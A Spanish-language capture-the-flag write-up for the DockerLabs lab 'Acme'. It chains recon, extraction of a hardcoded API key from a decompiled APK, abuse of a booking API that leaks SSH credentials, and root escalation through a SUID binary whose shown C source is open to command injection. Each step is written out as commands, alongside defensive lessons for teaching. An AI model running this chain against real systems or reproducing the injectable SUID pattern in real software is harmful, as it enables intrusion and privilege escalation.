# Writeup — Acme (DockerLabs)
  
## 1. Resumen de la intrusión
 
La máquina encadena un fallo de aplicación móvil, uno de API y uno de privilegios locales:
 
1. La web publica una APK y avisa de que hay un secreto en `BuildConfig`.
2. Al decompilar la APK aparecen una API key y la URL de un backend interno de reservas.
3. Esa clave da acceso a la API, que expone el endpoint `properties` y una pista.
4. Un `POST /sessions` con el `tenant_account` devuelve credenciales SSH.
5. Con esas credenciales se entra como el usuario `deploy`.
6. `deploy` puede ejecutar como root un binario SUID vulnerable a inyección de comandos.
7. Se abusa de ese binario para obtener una shell de root.
## 2. Reconocimiento
 
Tras desplegar el laboratorio (`sudo bash auto_deploy.sh decompile.tar`) se obtiene la IP del contenedor, `172.17.0.2`.
 
Escaneo de todos los puertos:
 
```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG puertos
```
 
Hay dos puertos abiertos:
 
| Puerto | Servicio |
| --- | --- |
| 22/tcp | SSH |
| 80/tcp | HTTP |
 
Escaneo de versiones sobre esos puertos:
 
```bash
sudo nmap -sCV -p22,80 172.17.0.2 -oN servicios
```
 
El puerto 80 sirve nginx 1.18.0 (Ubuntu). El puerto 22 (SSH) se reserva para más adelante: no es la entrada inicial, sino el destino una vez se consigan credenciales.
 
## 3. Enumeración web

AVISO!!! Es muy probable que algunos de los comandos no funcionen sin antes instalar las herramientas necesarias (por ejemplo ffuf).

Identificación de tecnologías y rutas:
 
```bash
whatweb http://172.17.0.2          # nginx/1.18.0, Ubuntu
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
#   /about    (200)
#   /booking  (301)
```
 
La página principal (InmoHogar · Roomshare) entrega las pistas del primer tramo:
 
- Una APK descargable (`app-release.apk`).
- Un aviso: conviene decompilarla, y la pista está en `com/inmohogar/roomshare/BuildConfig.java`.
- Un backend de reservas en `https://booking.internal/v3/` ("solo accesible desde la red interna").
- El cliente Android autentica con la cabecera `X-API-Key`, definida en `BuildConfig`.
Descarga de la APK:
 
```bash
wget http://172.17.0.2/app-release.apk
```
 
## 4. Análisis de la APK (jadx)
 
Decompilación con jadx (con ruta absoluta, por una peculiaridad del empaquetado en Kali):
 
```bash
jadx /home/kali/app-release.apk -d salida
```
 
La APK es mínima (una sola clase). Todo el interés está en `BuildConfig.java`:
 
```java
public static final String BOOKING_API_KEY  = "BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9";
public static final String BOOKING_BASE_URL  = "https://booking.internal/v3/";
public static final String TENANT_ACCOUNT    = "INMO-MAD-PRIMARY";
public static final String AUTH_HEADER       = "X-API-Key";
public static final String CTF_STAGE1        = "FLAG{stage1_buildconfig_leak_...}";
```

<img width="886" height="516" alt="image" src="https://github.com/user-attachments/assets/a22e6d1d-0b2b-4efa-8624-8bfe646627f0" />

 
De aquí salen cuatro datos clave —la API key, la URL base, el tenant y el nombre exacto de la cabecera de autenticación— y la flag de la fase 1. El `AndroidManifest.xml` solo contiene una `MainActivity`, sin rutas de API: el endpoint habrá que descubrirlo contra el servidor.
 
> Lección: meter secretos en el código de una app móvil es inseguro; cualquiera puede decompilar el APK y leerlos.
 
## 5. Explotación de la API de reservas
 
La API cuelga de la ruta `/booking/` de nginx; su backend responde en JSON y su 404 es `{"error": "not found"}` (22 bytes). Se fuzzean rutas filtrando ese 404:
 
```bash
ffuf -u http://172.17.0.2/booking/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fs 22
#   properties  [Status: 401]   <- existe, pero pide autenticación
```
 
El `401` (no `404`) confirma que `properties` es un recurso real. Con la API key devuelve datos y, además, una pista:

(Para usar el comando jq debes de instalar la herramienta primero. No es necesario, solo sirve para sacar el resultado con un formato más legible)
 
```bash
curl -s http://172.17.0.2/booking/properties \
  -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  -H "X-Tenant-Account: INMO-MAD-PRIMARY" | jq
#   "_ctf_hint": "Auth OK. Try POST /sessions with tenant_account=INMO-MAD-PRIMARY"
```
 
Siguiendo la pista, un `POST` a `/booking/sessions` con el `tenant_account`:
 
```bash
curl -s -X POST http://172.17.0.2/booking/sessions \
  -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  -H "Content-Type: application/json" \
  -d '{"tenant_account":"INMO-MAD-PRIMARY"}' | jq
```
 <img width="886" height="191" alt="image" src="https://github.com/user-attachments/assets/78bf1faa-db78-48f4-a02a-0797575b8828" />

La respuesta trae la flag de la fase 2 en `sessionData` y, sobre todo, la última pista:
 
```
"_ctf_hint": "Auth accepted (Stage 2). Next: SSH user=deploy pwd=c0mpartir-p1s0s"
```
 
Es decir: credenciales SSH (`deploy` / `c0mpartir-p1s0s`), que conectan con el puerto 22 reservado al principio.
 
> Lección: la seguridad por oscuridad (ocultar la ruta o el host) no protege; la API debería aplicar autorización real y no filtrar pistas ni credenciales en sus respuestas.
 
## 6. Acceso inicial (SSH)
 
```bash
ssh deploy@172.17.0.2      # contraseña: c0mpartir-p1s0s
```
 
Ya dentro, como usuario `deploy`:
 
```bash
whoami                 # deploy
id                     # uid=1000(deploy) ...
ls -la                 # flag-stage3.txt
cat flag-stage3.txt    # stage3_ssh_user_land_...
```
 
Con esto se consigue el acceso al sistema y la flag de la fase 3.
 
## 7. Escalada de privilegios a root
 
Revisión de permisos sudo:
 
```bash
sudo -l
#   (root) NOPASSWD: /opt/decompile/ssh/privesc/manage-svc
```
 
El binario `manage-svc` es SUID root y, además, tiene su código fuente al lado:
 
```bash
ls -la /opt/decompile/ssh/privesc/
#   -rwsr-xr-x  manage-svc      <- bit SUID (la 's')
#   -rw-r--r--  manage-svc.c    <- fuente
```
 
El fuente revela la vulnerabilidad: el primer argumento se concatena sin sanear en una cadena que, tras un `;`, se ejecuta en una shell, y el programa se ha puesto antes como root:
 
```c
setuid(0); setgid(0);
snprintf(buf, sizeof(buf),
    "logger -t decompile-ctf 'restart-booking-gw: %s' >/dev/null 2>&1 ; %s",
    argv[1], argv[1]);          // el 2º %s se ejecuta tal cual
execl("/bin/bash", "bash", "-c", buf, NULL);
```
 
Es una inyección de comandos vía argv. Basta pasar `/bin/bash` como argumento para que, tras el `;`, se lance una shell de root:
 
```bash
/opt/decompile/ssh/privesc/manage-svc /bin/bash
id        # uid=0(root)
```
 
Con root, se recoge la flag final:
 
```bash
cat /root/root.txt
```
 <img width="886" height="380" alt="image" src="https://github.com/user-attachments/assets/9e64831f-3237-421a-b52c-29c1d0060a80" />

> Lección: un binario SUID nunca debe construir comandos con entrada del usuario ni pasarla a una shell; conviene usar `execv` (sin shell) y soltar privilegios cuanto antes.
 
## 8. Flags
 
| Fase | Dónde | Flag |
| --- | --- | --- |
| Stage 1 | `BuildConfig` de la APK | `FLAG{stage1_buildconfig_leak_...}` |
| Stage 2 | Respuesta de `POST /sessions` | `stage2_..._accepted_...` |
| Stage 3 | `flag-stage3.txt` (usuario) | `stage3_ssh_user_land_...` |
| Root | `/root/root.txt` | *(flag final)* |
 
Los valores completos aparecen en la terminal durante la resolución.
